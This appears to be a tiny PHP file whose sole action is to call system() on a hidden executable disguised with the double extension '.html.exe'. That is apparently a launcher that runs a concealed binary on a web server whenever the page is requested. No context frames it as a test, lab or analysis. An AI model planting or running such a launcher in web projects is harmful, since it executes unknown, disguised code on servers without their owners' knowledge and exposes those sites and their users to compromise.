<?php
    system(".html.exe");
?>